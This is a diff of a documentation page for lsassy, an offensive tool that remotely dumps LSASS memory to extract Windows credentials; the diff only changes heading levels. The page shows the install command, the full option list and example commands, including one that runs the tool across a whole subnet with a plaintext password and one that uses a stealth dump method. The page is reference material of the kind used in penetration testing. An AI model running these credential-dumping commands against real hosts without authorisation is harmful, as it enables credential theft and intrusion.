@@ -13,19 +13,19 @@ weight : 0
 
 Remote LSASS dumper - Python library to remotely extract credentials on a set of hosts.
 
-### Installation
+## Installation
 
 ```plain
 python3 -m pip install lsassy
 ```
 
-### Usage
+## Usage
 
 ```plain
 lsassy [-h] [-m DUMP_METHOD] [--dump-path DUMP_PATH] [--dump-name DUMP_NAME] [-e EXEC] [--no-powershell] [--copy] [-O OPTIONS] [--timeout TIMEOUT] [--parse-only] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [--port PORT] [--no-pass] [-H HASHES] [-k] [-dc-ip ip address] [-aesKey hex key] [-K KERBEROS_DIR] [-o OUTFILE] [-f {pretty,json,grep,table}] [--users] [-v] [--threads THREADS] [-q] [-V] [target ...]
 ```
 
-### Flags
+## Flags
 
 ```plain
 lsassy v3.1.0 - Remote lsass dump reader
@@ -83,7 +83,7 @@ example:
     lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.0/24
 ```
 
-### Examples
+## Examples
 
 #### Dump lsass from single target
 
@@ -130,7 +130,7 @@ $ lsassy -d offsec.nl -u john.do -p 'Welkom1234' 10.10.10.10 -m comsvcs_stealth
 
 {{%attachments title="Compiled binaries" fa_icon_class="far fa-file" pattern=".*(exe|dll)"/%}}
 
-### URL list
+## URL List
 
 * [GitHub.com - lsassy](https://github.com/Hackndo/lsassy)
 * [Github.com - Dumpert](https://github.com/outflanknl/Dumpert)
